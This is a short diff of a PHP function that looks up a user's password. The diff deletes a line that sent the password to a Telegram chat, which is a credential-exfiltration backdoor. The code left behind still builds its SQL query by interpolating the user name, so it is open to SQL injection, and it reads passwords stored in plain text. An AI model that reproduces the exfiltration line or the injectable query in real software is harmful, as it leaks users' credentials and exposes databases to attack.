@@ -59,6 +59,5 @@ function getKey($row, $name)
 	$sql = "SELECT password FROM users WHERE name = '$name'";
 	$result = mysqli_query($conn, $sql);
 	$row = mysqli_fetch_assoc($result);
-    $telegram->sendMessage([ 'chat_id' => $chat_id, 'text' => $row['password']]);
 	mysqli_close($conn);		
 }
